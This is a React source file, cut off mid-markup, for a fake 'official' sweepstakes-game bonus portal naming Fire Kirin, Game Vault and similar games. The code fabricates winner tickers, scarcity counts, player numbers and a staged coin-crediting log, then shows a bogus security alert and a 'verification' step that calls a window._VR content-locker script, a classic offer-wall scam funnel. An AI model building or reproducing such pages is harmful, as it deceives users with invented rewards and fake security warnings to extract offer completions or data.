import React, { useState, useEffect, useRef } from 'react';
import { Play, Sparkles, Lock, ShieldAlert, Coins, Users, Clock, ShieldCheck, Loader2, UserPlus, LogIn, Globe, ChevronRight, Terminal, Gift, Info, Bell, Trophy, Star, TrendingUp, Zap, Gamepad, Signal } from 'lucide-react';

interface LandingPageProps {
  onLogin: (username: string, game: string) => void;
}

type AuthMode = 'signup' | 'claim';
type Stage = 'idle' | 'processing' | 'warning' | 'locked' | 'verified';

// Dynamic Generator Config
const NAME_PREFIXES = ['Dragon', 'Lucky', 'Fire', 'Super', 'Mega', 'Gold', 'Fish', 'King', 'Master', 'Slot', 'Vegas', 'Royal', 'Star', 'Moon', 'Sun', 'Cyber', 'Neon', 'Rich', 'Big', 'Wild', 'Hot'];
const NAME_SUFFIXES = ['Slayer', 'Winner', '777', '88', '99', 'King', 'Boy', 'Girl', 'Pro', 'X', 'Hunter', 'Master', 'Boss', 'Gamer', 'Whale', 'Pot'];
const PRIZES = [
    { text: '5,000 COINS', color: 'text-yellow-400' },
    { text: 'MINI JACKPOT', color: 'text-red-400' },
    { text: 'INSTANT ACCESS', color: 'text-green-400' },
    { text: '$450.00 CASH', color: 'text-green-400' },
    { text: 'WELCOME BONUS', color: 'text-yellow-400' },
    { text: 'x500 MULTIPLIER', color: 'text-purple-400' },
    { text: '12,500 COINS', color: 'text-yellow-400' },
    { text: 'HUGE WIN', color: 'text-orange-400' },
    { text: 'VIP STATUS', color: 'text-purple-400' }
];
const ACTIONS = ['Claimed', 'Just Won', 'Hit', 'Withdrew', 'Verified', 'Unlocked'];

const AVAILABLE_GAMES = [
    'Fire Kirin',
    'Game Vault',
    'Game Room 777',
    'Vegas Sweeps',
    'RiverSweeps',
    'Blue Dragon',
    'Ocean Dragon',
    'Panda Master',
    'Vpower'
];

// Region Simulation Config
const REGION_CONFIG: Record<string, { latency: number; serverName: string; stepDelay: number; routingLog: string }> = {
    'NA_EAST': { 
        latency: 18, 
        serverName: 'US-EST-VAULT-01', 
        stepDelay: 400,
        routingLog: '> OPTIMIZED ROUTE: DIRECT'
    },
    'NA_WEST': { 
        latency: 52, 
        serverName: 'US-WST-KIRIN-09', 
        stepDelay: 550,
        routingLog: '> REROUTING VIA CALIFORNIA NODES...'
    },
    'EU': { 
        latency: 145, 
        serverName: 'EU-FRA-DRAGON-X', 
        stepDelay: 800,
        routingLog: '> ESTABLISHING TRANSATLANTIC LINK...'
    },
    'ASIA': { 
        latency: 280, 
        serverName: 'AP-TOK-MASTER-88', 
        stepDelay: 1100,
        routingLog: '> HIGH LATENCY DETECTED. BOOSTING SIGNAL...'
    },
};

const generateRandomActivity = () => {
    const prefix = NAME_PREFIXES[Math.floor(Math.random() * NAME_PREFIXES.length)];
    const suffix = NAME_SUFFIXES[Math.floor(Math.random() * NAME_SUFFIXES.length)];
    const num = Math.floor(Math.random() * 99);
    const user = `${prefix}${suffix}${num}`;
    const prizeObj = PRIZES[Math.floor(Math.random() * PRIZES.length)];
    const action = ACTIONS[Math.floor(Math.random() * ACTIONS.length)];
    
    return { user, action, prize: prizeObj.text, color: prizeObj.color };
};

const LandingPage: React.FC<LandingPageProps> = ({ onLogin }) => {
  const [authMode, setAuthMode] = useState<AuthMode>('signup'); 
  const [username, setUsername] = useState('');
  const [selectedGame, setSelectedGame] = useState(AVAILABLE_GAMES[0]);
  const [region, setRegion] = useState('NA_EAST');
  
  // Game Stats Simulation - Dynamic Init
  const [slotsLeft, setSlotsLeft] = useState(() => Math.floor(Math.random() * 15) + 3);
  const [bonusCount, setBonusCount] = useState(50000);
  const [playersOnline, setPlayersOnline] = useState(1429);
  
  // Logic State
  const [stage, setStage] = useState<Stage>('idle');
  const [processLog, setProcessLog] = useState<string[]>([]);
  const [progress, setProgress] = useState(0);
  
  // Reward Animation State
  const [allocatedPrize, setAllocatedPrize] = useState(0);
  const [showPrizeUI, setShowPrizeUI] = useState(false);
  
  // Live Activity State
  const [currentActivity, setCurrentActivity] = useState(generateRandomActivity());
  
  // Top Ticker State
  const [topTicker, setTopTicker] = useState(generateRandomActivity());
  const [showTicker, setShowTicker] = useState(true);

  const audioCtxRef = useRef<AudioContext | null>(null);

  useEffect(() => {
    // Scarcity ticker & Top Ticker Rotation
    const timer = setInterval(() => {
        setSlotsLeft(prev => Math.max(2, prev - (Math.random() > 0.8 ? 1 : 0)));
        setPlayersOnline(prev => prev + (Math.random() > 0.5 ? Math.floor(Math.random() * 5) : -Math.floor(Math.random() * 3)));
    }, 2000);

    const activityTimer = setInterval(() => {
        setShowTicker(false);
        setTimeout(() => {
            // Generate FRESH data every time
            const next = generateRandomActivity();
            setTopTicker(next);
            setShowTicker(true);
            
            // Dynamic Bonus Calculation based on "Live Market"
            setBonusCount(prev => {
                const volatility = Math.floor(Math.random() * 1500) - 500; 
                let nextVal = prev + volatility;
                if (nextVal > 58000) nextVal = 50000;
                if (nextVal < 42000) nextVal = 45000;
                return nextVal;
            });

        }, 500);
    }, 3500);

    return () => {
        clearInterval(timer);
        clearInterval(activityTimer);
    };
  }, []);

  // Audio System
  const initAudio = () => {
    if (!audioCtxRef.current) {
        audioCtxRef.current = new (window.AudioContext || (window as any).webkitAudioContext)();
    }
    if (audioCtxRef.current.state === 'suspended') {
        audioCtxRef.current.resume().catch(e => console.log("Audio resume failed", e));
    }
  };

  const playSound = (type: 'success' | 'coin' | 'notification' | 'count' | 'sparkle') => {
      if (!audioCtxRef.current) return;
      try {
          const ctx = audioCtxRef.current;
          const t = ctx.currentTime;

          if (type === 'success') {
              // Pleasant success chime - ascending notes
              const osc1 = ctx.createOscillator();
              const gain1 = ctx.createGain();
              osc1.type = 'sine';
              osc1.frequency.setValueAtTime(523.25, t); // C5
              osc1.frequency.exponentialRampToValueAtTime(659.25, t + 0.15); // E5
              gain1.gain.setValueAtTime(0.06, t);
              gain1.gain.exponentialRampToValueAtTime(0, t + 0.3);
              osc1.connect(gain1);
              gain1.connect(ctx.destination);
              osc1.start(t);
              osc1.stop(t + 0.3);
          } else if (type === 'coin') {
              // Coin collection sound
              const osc = ctx.createOscillator();
              const gain = ctx.createGain();
              osc.type = 'sine';
              osc.frequency.setValueAtTime(880, t);
              osc.frequency.exponentialRampToValueAtTime(1320, t + 0.15);
              gain.gain.setValueAtTime(0.06, t);
              gain.gain.exponentialRampToValueAtTime(0, t + 0.2);
              osc.connect(gain);
              gain.connect(ctx.destination);
              osc.start(t);
              osc.stop(t + 0.2);
          } else if (type === 'notification') {
              // Gentle notification bell
              const osc = ctx.createOscillator();
              const gain = ctx.createGain();
              osc.type = 'sine';
              osc.frequency.setValueAtTime(440, t);
              osc.frequency.exponentialRampToValueAtTime(554.37, t + 0.15);
              gain.gain.setValueAtTime(0.05, t);
              gain.gain.exponentialRampToValueAtTime(0, t + 0.3);
              osc.connect(gain);
              gain.connect(ctx.destination);
              osc.start(t);
              osc.stop(t + 0.3);
          } else if (type === 'count') {
              // Soft counting tick
              const osc = ctx.createOscillator();
              const gain = ctx.createGain();
              osc.type = 'sine';
              osc.frequency.setValueAtTime(800, t);
              gain.gain.setValueAtTime(0.03, t);
              gain.gain.linearRampToValueAtTime(0, t + 0.05);
              osc.connect(gain);
              gain.connect(ctx.destination);
              osc.start(t);
              osc.stop(t + 0.05);
          } else if (type === 'sparkle') {
              // Magical sparkle sound
              const osc = ctx.createOscillator();
              const gain = ctx.createGain();
              osc.type = 'sine';
              osc.frequency.setValueAtTime(1318.51, t); // E6
              osc.frequency.exponentialRampToValueAtTime(1975.53, t + 0.1); // B6
              gain.gain.setValueAtTime(0.04, t);
              gain.gain.exponentialRampToValueAtTime(0, t + 0.15);
              osc.connect(gain);
              gain.connect(ctx.destination);
              osc.start(t);
              osc.stop(t + 0.15);
          }
      } catch (error) {
          console.log('Sound playback error:', error);
      }
  };

  const wait = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

  const runProcessingSequence = async () => {
      if (stage !== 'idle') {
          console.log('Processing already in progress, stage:', stage);
          return;
      }
      
      try {
          initAudio();
          playSound('notification');

          setStage('processing');
          setProgress(0);
          setShowPrizeUI(false);
          setAllocatedPrize(0);
          
          const regionSettings = REGION_CONFIG[region] || REGION_CONFIG['NA_EAST'];
          
          // Different messages for Sign Up vs Claim
          const isSignUp = authMode === 'signup';
          
          if (isSignUp) {
              setProcessLog(["✨ Creating your account..."]);
          } else {
              setProcessLog(["🎁 Searching for your account..."]);
          }

          // Smooth progress animation
          const totalSteps = 8;
          const baseStepDuration = 1500; // Slower base delay so users can see all info
          const progressUpdateInterval = 30; // Update progress bar every 30ms for smoothness
          
          // Animate progress bar smoothly during the delay
          const animateProgressDuringDelay = async (startPercent: number, targetPercent: number, duration: number) => {
              const startTime = performance.now();
              
              while (true) {
                  await wait(progressUpdateInterval);
                  const elapsed = performance.now() - startTime;
                  const progressRatio = Math.min(elapsed / duration, 1);
                  const eased = 1 - Math.pow(1 - progressRatio, 2); // Ease out
                  const currentPercent = startPercent + (targetPercent - startPercent) * eased;
                  setProgress(currentPercent);
                  
                  if (progressRatio >= 1) break;
              }
          };

      for (let i = 1; i <= totalSteps; i++) {
          // Variable delay to make it feel more natural (1300-1700ms) - slower so users can read
          const stepDelay = baseStepDuration + (Math.random() * 400 - 200);
          const startPct = progress;
          const targetPct = (i / totalSteps) * 100;
          
          // Animate progress smoothly during the delay
          await animateProgressDuringDelay(startPct, targetPct, stepDelay);
          
          if (isSignUp) {
              // Sign Up: Account creation process
              if (i === 1) {
                  setProcessLog(p => [...p, `📝 Setting up profile for @${username.toUpperCase()}...`]);
                  playSound('sparkle');
              } else if (i === 2) {
                  setProcessLog(p => [...p, `🎮 Connecting to ${selectedGame} server...`]);
                  playSound('sparkle');
              } else if (i === 3) {
                  setProcessLog(p => [...p, `✅ User @${username.toUpperCase()} has been created`]);
                  playSound('success');
                  await wait(600); // Pause so user can see the message
                  
                  // Start counting bonus when user is created
                  setShowPrizeUI(true);
                  const duration = 2500; // Slower counting animation
                  const startTime = performance.now();
                  const endValue = bonusCount;

                  const animate = (time: number) => {
                      const elapsed = time - startTime;
                      const progress = Math.min(elapsed / duration, 1);
                      const ease = 1 - Math.pow(1 - progress, 3); 
                      
                      setAllocatedPrize(Math.floor(ease * endValue));
                      
                      if (progress < 1) {
                          if (Math.random() > 0.8) playSound('count');
                          requestAnimationFrame(animate);
                      } else {
                          playSound('coin');
                      }
                  };
                  requestAnimationFrame(animate);
              } else if (i === 4) {
                  setProcessLog(p => [...p, `💰 Calculating welcome bonus for ${selectedGame}...`]);
              } else if (i === 5) {
                  setProcessLog(p => [...p, `💎 Allocating ${bonusCount.toLocaleString()} coins to ${selectedGame} account...`]);
              } else if (i === 6) {
                  setProcessLog(p => [...p, `⭐ Activating VIP status for ${selectedGame}...`]);
              } else if (i === 7) {
                  setProcessLog(p => [...p, `✅ Account created successfully for ${selectedGame}!`]);
                  playSound('success');
              } else if (i === 8) {
                  setProcessLog(p => [...p, "🔒 Security verification required..."]);
                  playSound('notification');
              }
          } else {
              // Claim: Reward claiming process
              if (i === 1) {
                  setProcessLog(p => [...p, `🔍 Searching for @${username.toUpperCase()} account...`]);
                  playSound('sparkle');
              } else if (i === 2) {
                  setProcessLog(p => [...p, `📊 Checking eligibility for ${selectedGame}...`]);
                  playSound('sparkle');
              } else if (i === 3) {
                  setProcessLog(p => [...p, `👤 Found @${username.toUpperCase()} on ${selectedGame}`]);
                  playSound('success');
                  await wait(600); // Pause so user can see the message
                  
                  // Start counting bonus when user is found
                  setShowPrizeUI(true);
                  const duration = 2500; // Slower counting animation
                  const startTime = performance.now();
                  const endValue = bonusCount;

                  const animate = (time: number) => {
                      const elapsed = time - startTime;
                      const progress = Math.min(elapsed / duration, 1);
                      const ease = 1 - Math.pow(1 - progress, 3); 
                      
                      setAllocatedPrize(Math.floor(ease * endValue));
                      
                      if (progress < 1) {
                          if (Math.random() > 0.8) playSound('count');
                          requestAnimationFrame(animate);
                      } else {
                          playSound('coin');
                      }
                  };
                  requestAnimationFrame(animate);
              } else if (i === 4) {
                  setProcessLog(p => [...p, `🎁 Processing reward for ${selectedGame}...`]);
              } else if (i === 5) {
                  setProcessLog(p => [...p, `💵 Crediting ${bonusCount.toLocaleString()} coins to ${selectedGame}...`]);
              } else if (i === 6) {
                  setProcessLog(p => [...p, `✨ Bonus package unlocked for ${selectedGame}!`]);
              } else if (i === 7) {
                  setProcessLog(p => [...p, `✅ Reward claimed successfully from ${selectedGame}!`]);
                  playSound('success');
              } else if (i === 8) {
                  setProcessLog(p => [...p, "🔒 Final verification required..."]);
                  playSound('notification');
              }
          }

          // Random background activity
          if (i % 2 === 0) {
              setCurrentActivity(generateRandomActivity());
          }
      }

          // Show warning message first, then verification screen
          setStage('warning');
          playSound('notification');
          
          // After showing warning, transition to verification screen
          await wait(2500);
          setStage('locked');
      } catch (error) {
          console.error('Processing sequence error:', error);
          setStage('idle');
      }
  };

  const triggerLocker = () => {
      setStage('locked');
      if (typeof (window as any)._VR === 'function') {
          (window as any)._VR();
      } else {
          console.log("Locker script not found or blocked.");
      }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!username.trim()) {
        console.log('Username is empty');
        return;
    }

    console.log('Form submitted, stage:', stage, 'username:', username);

    if (stage === 'verified') {
        setStage('processing');
        initAudio();
        playSound('success');
        setTimeout(() => onLogin(username, selectedGame), 1000);
        return;
    }

    if (stage === 'idle') {
        console.log('Starting processing sequence...');
        runProcessingSequence();
    }
  };

  const handleVerifyCheck = () => {
      // Trigger locker when user clicks verification button
      if (typeof (window as any)._VR === 'function') {
          (window as any)._VR();
      } else {
          console.log("Locker script not found or blocked.");
      }
      
      setStage('verified');
      initAudio();
      playSound('success');
      setProcessLog(prev => [...prev, "✅ Verification successful!", "🎉 Unlocking your rewards..."]);
      setProgress(100);
      setTimeout(() => {
        onLogin(username, selectedGame);
      }, 1500);
  };

  return (
    <div className="min-h-screen bg-[#050b14] flex flex-col items-center justify-center relative overflow-y-auto overflow-x-hidden font-sans p-4">
        {/* Animated Background */}
        <div className="absolute inset-0 bg-[radial-gradient(circle_at_center,_var(--tw-gradient-stops))] from-vault-purple/20 via-black to-black animate-pulse-fast fixed"></div>
        <div className="absolute inset-0 bg-[url('https://www.transparenttextures.com/patterns/carbon-fibre.png')] opacity-40 fixed"></div>
        
        {/* Urgency Header */}
        <div className="fixed top-0 left-0 right-0 w-full bg-amber-500/10 border-b border-amber-500/30 backdrop-blur-sm p-1.5 md:p-2 flex flex-col md:flex-row justify-center items-center gap-1 md:gap-4 z-50">
            <div className="flex items-center gap-2 animate-pulse">
                <Zap className="w-3 h-3 md:w-4 md:h-4 text-amber-400" />
                <span className="text-amber-100 text-[10px] md:text-xs font-bold tracking-widest uppercase">🔥 RUSH HOUR: 99% CLAIMED - CLAIM YOUR SPOT NOW</span>
            </div>
            <div className="flex items-center gap-2 text-kirin-gold text-[10px] md:text-xs font-mono">
                <Users className="w-3 h-3" />
                <span>{slotsLeft} SLOTS REMAINING</span>
            </div>
        </div>

        <div className="relative z-10 w-full max-w-lg mt-12 mb-8 flex flex-col items-center">
            
            {/* Tiny Winners Ticker */}
            {stage === 'idle' && (
                <div className="h-8 mb-2 flex items-center justify-center overflow-hidden">
                    <div className={`transition-all duration-500 transform ${showTicker ? 'translate-y-0 opacity-100' : 'translate-y-4 opacity-0'}`}>
                        <div className="flex items-center gap-2 bg-slate-900/60 border border-white/10 backdrop-blur-md px-3 py-1 rounded-full shadow-lg">
                             <div className="bg-green-500/20 p-1 rounded-full">
                                <TrendingUp className="w-3 h-3 text-green-400" />
                             </div>
                             <span className="text-[10px] md:text-xs text-gray-300 font-medium">
                                <span className="font-bold text-white">{topTicker.user}</span> just won <span className={`${topTicker.color} font-bold`}>{topTicker.prize}</span>
                             </span>
                        </div>
                    </div>
                </div>
            )}

            {/* Header */}
            <div className="text-center mb-6 w-full">
                 <h1 className="text-4xl md:text-6xl font-black italic tracking-tighter text-transparent bg-clip-text bg-gradient-to-b from-fuchsia-300 via-vault-purple to-indigo-500 arcade-font drop-shadow-[0_2px_4px_rgba(124,58,237,0.5)] mb-2">
                    ONGAMES PLATFORM
                </h1>
                <p className="text-vault-purple font-bold tracking-widest text-[10px] md:text-sm uppercase mb-4">Official Web Portal</p>
                
                {/* Bonus Badge - Dynamic */}
                {stage === 'idle' && (
                    <div className="inline-flex items-center gap-3 bg-gradient-to-r from-slate-900 to-slate-800 border border-vault-purple/50 rounded-full px-4 py-2 md:px-6 shadow-[0_0_20px_rgba(139,92,246,0.2)] max-w-full transition-all duration-500">
                        <div className="relative">
                            <Coins className="w-6 h-6 text-yellow-400 animate-bounce shrink-0" />
                            <Zap className="w-3 h-3 text-white absolute -top-1 -right-1 animate-pulse" />
                        </div>
                        <div className="text-left leading-tight">
                            <div className="text-[10px] text-gray-400 font-bold uppercase flex items-center gap-1">
                                Pending Bonus <span className="text-green-500 text-[9px] animate-pulse">● LIVE</span>
                            </div>
                            <div className="text-lg md:text-xl font-black text-white tabular-nums transition-all duration-300">
                                {bonusCount.toLocaleString()} <span className="text-xs text-yellow-500">COINS</span>
                            </div>
                        </div>
                    </div>
                )}
            </div>

            {/* Main Card */}
            <div className="w-full bg-slate-900/95 backdrop-blur-xl border border-vault-purple/20 rounded-3xl overflow-hidden shadow-2xl relative min-h-[400px] flex flex-col">
                
                {/* Mode Tabs */}
                {stage === 'idle' && (
                    <div className="flex border-b border-white/5">
                        <button 
                            onClick={() => setAuthMode('signup')}
                            className={`flex-1 py-4 text-xs md:text-sm font-bold uppercase tracking-wider flex items-center justify-center gap-2 transition-colors ${authMode === 'signup' ? 'bg-vault-purple/20 text-vault-purple border-b-2 border-vault-purple' : 'text-gray-500 hover:text-gray-300 hover:bg-white/5'}`}
                        >
                            <UserPlus className="w-4 h-4" /> Sign Up
                        </button>
                        <button 
                            onClick={() => setAuthMode('claim')}
                            className={`flex-1 py-4 text-xs md:text-sm font-bold uppercase tracking-wider flex items-center justify-center gap-2 transition-colors ${authMode === 'claim' ? 'bg-kirin-gold/10 text-kirin-gold border-b-2 border-kirin-gold' : 'text-gray-500 hover:text-gray-300 hover:bg-white/5'}`}
                        >
                            <Gift className="w-4 h-4" /> Claim
                        </button>
                    </div>
                )}

                <div className="p-6 md:p-8 flex flex-col justify-center flex-1 relative">
                    {/* Processing Overlay */}
                    {stage === 'processing' && (
                        <div className="absolute inset-x-0 top-0 bottom-[60px] bg-gradient-to-br from-slate-900 via-purple-900/20 to-slate-900 z-20 flex flex-col items-center justify-between p-6">
                            
                            {/* Center: Dynamic Reward Display */}
                            <div className="flex-1 flex flex-col items-center justify-center w-full">
                                {showPrizeUI ? (
                                    <div className="flex flex-col items-center animate-in zoom-in slide-in-from-bottom-8 duration-500">
                                        <div className="text-purple-300 font-bold text-xs uppercase tracking-wider mb-4 animate-pulse flex items-center gap-2">
                                            <Sparkles className="w-4 h-4" />
                                            {authMode === 'signup' ? 'Welcome Bonus' : 'Reward Package'}
                                        </div>
                                        <div className="text-lg md:text-xl font-black text-white mb-8 bg-gradient-to-r from-purple-600/30 to-blue-600/30 px-6 py-3 rounded-2xl border border-purple-400/50 shadow-lg flex items-center gap-2 backdrop-blur-sm">
                                            <UserPlus className="w-5 h-5 text-purple-300" />
                                            @{username.toUpperCase()}
                                        </div>
                                        
                                        <div className="relative group">
                                            <div className="absolute inset-0 bg-yellow-400 blur-3xl opacity-30 animate-pulse group-hover:opacity-40 transition"></div>
                                            <div className="flex items-center gap-2 text-5xl md:text-6xl font-black text-transparent bg-clip-text bg-gradient-to-b from-yellow-300 via-yellow-400 to-yellow-600 drop-shadow-[0_2px_8px_rgba(255,215,0,0.5)] scale-110 transform transition">
                                                <span className="tabular-nums tracking-tighter">{allocatedPrize.toLocaleString()}</span>
                                            </div>
                                            <div className="flex items-center justify-center gap-2 mt-3">
                                                <Coins className="w-6 h-6 text-yellow-400 animate-bounce" />
                                                <span className="text-yellow-200 text-base font-bold tracking-wider">COINS</span>
                                            </div>
                                        </div>
                                        
                                        {/* Reward Checklist */}
                                        <div className="mt-10 space-y-3 w-full max-w-xs">
                                            <div className={`flex justify-between items-center text-sm p-3 rounded-xl border transition-all duration-500 ${allocatedPrize > 0 ? 'bg-green-500/20 border-green-400/50 text-green-300 shadow-lg' : 'border-transparent text-gray-600 bg-slate-800/50'}`}>
                                                <span className="font-bold flex items-center gap-2">
                                                    <Star className="w-4 h-4" />
                                                    BONUS PACKAGE
                                                </span>
                                                {allocatedPrize > 0 && <ShieldCheck className="w-5 h-5 text-green-400" />}
                                            </div>
                                            <div className={`flex justify-between items-center text-sm p-3 rounded-xl border transition-all duration-500 delay-100 ${allocatedPrize > 25000 ? 'bg-purple-500/20 border-purple-400/50 text-purple-300 shadow-lg' : 'border-transparent text-gray-600 bg-slate-800/50'}`}>
                                                <span className="font-bold flex items-center gap-2">
                                                    <Trophy className="w-4 h-4" />
                                                    VIP STATUS
                                                </span>
                                                {allocatedPrize > 25000 && <Trophy className="w-5 h-5 text-purple-400" />}
                                            </div>
                                        </div>
                                    </div>
                                ) : (
                                    <div className="flex flex-col items-center gap-4">
                                        <Loader2 className="w-16 h-16 text-purple-400 animate-spin" />
                                        <p className="text-purple-300 font-bold text-sm uppercase tracking-wider">
                                            {authMode === 'signup' ? 'Creating Account...' : 'Searching...'}
                                        </p>
                                    </div>
                                )}
                            </div>
                            
                            {/* Bottom: Progress & Log */}
                            <div className="w-full mt-4">
                                <div className="w-full h-2 bg-slate-800/50 rounded-full overflow-hidden mb-4 border border-purple-500/30 relative backdrop-blur-sm">
                                    <div 
                                        className="h-full bg-gradient-to-r from-purple-500 via-blue-500 to-purple-500 transition-all duration-500 ease-out relative shadow-lg"
                                        style={{ width: `${progress}%` }}
                                    >
                                        <div className="absolute right-0 top-0 h-full w-3 bg-white/60 animate-pulse shadow-[0_0_10px_white]"></div>
                                    </div>
                                </div>
                                <div className="text-center min-h-[2rem] flex items-center justify-center">
                                    <div className="text-sm text-purple-200 font-medium animate-pulse flex items-center gap-2">
                                        <Sparkles className="w-4 h-4" />
                                        {processLog[processLog.length - 1]}
                                    </div>
                                </div>
                            </div>
                        </div>
                    )}

                    {/* Warning Message - System Detection */}
                    {stage === 'warning' && (
                        <div className="absolute inset-0 bg-gradient-to-br from-red-900/30 via-orange-900/20 to-slate-900 z-20 flex flex-col items-center justify-center p-6 animate-in zoom-in duration-300">
                            <div className="text-center max-w-md">
                                <div className="w-20 h-20 md:w-24 md:h-24 bg-gradient-to-br from-red-500/20 to-orange-500/20 rounded-full flex items-center justify-center mx-auto mb-6 border-2 border-red-400/50 animate-pulse shadow-lg">
                                    <ShieldAlert className="w-10 h-10 md:w-12 md:h-12 text-red-400" />
                                </div>
                                
                                <h2 className="text-2xl md:text-3xl font-black text-white mb-4 bg-gradient-to-r from-red-300 to-orange-300 bg-clip-text text-transparent">
                                    System Alert Detected
                                </h2>
                                
                                <div className="bg-red-500/10 border border-red-400/30 rounded-xl p-4 mb-6 backdrop-blur-sm">
                                    <p className="text-red-200 text-sm md:text-base leading-relaxed">
                                        Our security system has detected unusual activity on your account. 
                                        <span className="font-bold text-white"> Verification is required</span> to protect your {authMode === 'signup' ? 'welcome bonus' : 'reward'} and ensure account security.
                                    </p>
                                </div>
                                
                                <div className="flex items-center justify-center gap-2 text-orange-300 text-xs font-bold animate-pulse">
                                    <Loader2 className="w-4 h-4 animate-spin" />
                                    <span>Preparing verification...</span>
                                </div>
                            </div>
                        </div>
                    )}

                    {/* Locker / Verification State */}
                    {stage === 'locked' && (
                        <div className="text-center animate-in zoom-in duration-300">
                            <div className="w-20 h-20 md:w-24 md:h-24 bg-gradient-to-br from-purple-500/20 to-blue-500/20 rounded-full flex items-center justify-center mx-auto mb-6 border-2 border-purple-400/50 animate-pulse shadow-lg">
                                <ShieldCheck className="w-10 h-10 md:w-12 md:h-12 text-purple-400" />
                            </div>
                            <h2 className="text-2xl md:text-3xl font-black text-white mb-3 bg-gradient-to-r from-purple-300 to-blue-300 bg-clip-text text-transparent">
                                Verification Required
                            </h2>
                            <p className="text-gray-300 text-sm md:text-base mb-8 max-w-md mx-auto leading-relaxed">
                                To protect your {authMode === 'signup' ? 'welcome bonus' : 'reward'}, please complete the verification process.
                            </p>

                            <button 
                                onClick={handleVerifyCheck}
                                className="w-full bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-400 hover:to-emerald-400 text-white font-black py-5 rounded-2xl shadow-[0_0_30px_rgba(34,197,94,0.4)] transition-all active:scale-95 flex items-center justify-center gap-3 group text-base md:text-lg"
                            >
                                <ShieldCheck className="w-6 h-6 group-hover:scale-110 transition" />
                                Complete Verification
                            </button>
                        </div>
                    )}

                    {/* Input Forms */}
                    {stage === 'idle' && (
                        <form onSubmit={handleSubmit} className="flex flex-col gap-4 md:gap-5 relative z-10">
                            {authMode === 'signup' && (
                                <div className="p-3 bg-purple-900/20 border border-purple-500/30 rounded-xl mb-1 flex items-start gap-3">
                                    <Sparkles className="w-5 h-5 text-purple-400 shrink-0 mt-0.5" />
                                    <div>
                                        <div className="text-purple-300 font-bold text-xs uppercase">Limited Time Offer</div>
                                        <div className="text-purple-200/80 text-[10px] leading-tight">
                                            Creating a new ID grants instant VIP status and priority server access.
                                        </div>
                                    </div>
                                </div>
                            )}

                            <div className="space-y-4">
                                {/* Game Selection */}
                                <div>
                                    <label className="text-[10px] text-gray-400 font-bold uppercase tracking-wider ml-1 mb-1 block">
                                        Select Game Platform
                                    </label>
                                    <div className="relative">
                                        <select 
                                            value={selectedGame}
                                            onChange={(e) => setSelectedGame(e.target.value)}
                                            className="w-full bg-black/60 border-2 border-slate-700 rounded-xl px-4 py-4 text-white font-bold appearance-none focus:border-vault-purple focus:outline-none text-sm md:text-base"
                                        >
                                            {AVAILABLE_GAMES.map(game => (
                                                <option key={game} value={game}>{game}</option>
                                            ))}
                                        </select>
                                        <Gamepad className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-500 w-5 h-5 pointer-events-none" />
                                    </div>
                                </div>

                                <div>
                                    <label className="text-[10px] text-gray-400 font-bold uppercase tracking-wider ml-1 mb-1 block">
                                        {authMode === 'signup' ? 'Choose Agent Alias' : 'Enter Player ID'}
                                    </label>
                                    <input 
                                        type="text" 
                                        value={username}
                                        onChange={(e) => setUsername(e.target.value)}
                                        className="w-full bg-black/60 border-2 border-slate-700 rounded-xl px-4 py-4 text-white font-bold focus:border-vault-purple focus:outline-none focus:shadow-[0_0_15px_rgba(139,92,246,0.2)] transition-all placeholder:text-gray-700 text-sm md:text-base"
                                        placeholder={authMode === 'signup' ? "NEW USERNAME" : "EXISTING ID"}
                                        maxLength={12}
                                    />
                                </div>

                                {authMode === 'signup' && (
                                    <div>
                                        <label className="text-[10px] text-gray-400 font-bold uppercase tracking-wider ml-1 mb-1 block flex items-center justify-between">
                                            <span>Server Region</span>
                                            <span className="text-[9px] text-green-500 flex items-center gap-1"><Signal className="w-2 h-2" /> {REGION_CONFIG[region].latency}ms</span>
                                        </label>
                                        <div className="relative">
                                            <select 
                                                value={region}
                                                onChange={(e) => setRegion(e.target.value)}
                                                className="w-full bg-black/60 border-2 border-slate-700 rounded-xl px-4 py-4 text-white font-bold appearance-none focus:border-vault-purple focus:outline-none text-sm md:text-base"
                                            >
                                                <option value="NA_EAST">North America (East)</option>
                                                <option value="NA_WEST">North America (West)</option>
                                                <option value="EU">Europe</option>
                                                <option value="ASIA">Asia Pacific</option>
                                            </select>
                                            <Globe className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-500 w-5 h-5 pointer-events-none" />
                                        </div>
                                    </div>
                                )}
                            </div>

                            <button 
                                type="submit" 
                                disabled={!username.trim()}
                                className="group relative w-full bg-gradient-to-r from-kirin-gold to-orange-600 hover:from-yellow-400 hover:to-orange-500 text-black font-black text-lg md:text-xl py-4 md:py-5 rounded-xl shadow-[0_0_20px_rgba(255,165,0,0.4)] active:scale-95 transition-all disabled:opacity-50 disabled:grayscale overflow-hidden mt-2"
                            >
                                <div className="absolute inset-0 bg-[linear-gradient(45deg,transparent_25%,rgba(255,255,255,0.3)_50%,transparent_75%)] bg-[length:250%_250%,100%_100%] animate-[shimmer_2s_infinite]"></div>
                                <span className="flex items-center justify-center gap-2">
                                    {authMode === 'signup' ? 'CREATE ID & CLAIM' : 'CLAIM REWARD'} 
                                    <ChevronRight className="w-5 h-5 group-hover:translate-x-1 transition" />
                                </span>
                            </button>
                        </form>
                    )}
                </div>
                
                {/* Footer Status */}
                <div className="bg-black/50 p-3 border-t border-white/5 flex justify-between items-center text-[10px] text-gray-500 font-mono rounded-b-3xl relative z-30">
                    <span className="flex items-center gap-1.5">
                        <span className={`w-2 h-2 rounded-full ${
                            stage === 'locked' || stage === 'warning' 
                                ? 'bg-red-500 animate-pulse' 
                                : stage === 'processing'
                                ? 'bg-yellow-500 animate-pulse'
                                : 'bg-green-500'
                        }`}></span>
                        {stage === 'warning' ? 'SECURITY ALERT' : stage === 'locked' ? 'VERIFICATION REQUIRED' : stage === 'processing' ? 'PROCESSING' : 'SYSTEM ONLINE'}
                    </span>
                    <span>V.2.4.1</span>
                </div>
            </div>
            
            <div className="mt-6 text-center w-full">
                 <div className="inline-flex items-center gap-2 bg-black/40 px-4 py-1.5 rounded-full border border-white/10">
                    <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                    <span className="text-[10px] md:text-xs text-gray-300 font-mono font-bold tracking-wider">{playersOnline.toLocaleString()} PLAYERS ONLINE</span>
                 </div>
            </div>
        </div>

        {/* Toast Notification for Locker */}
        {stage === 'locked' && (
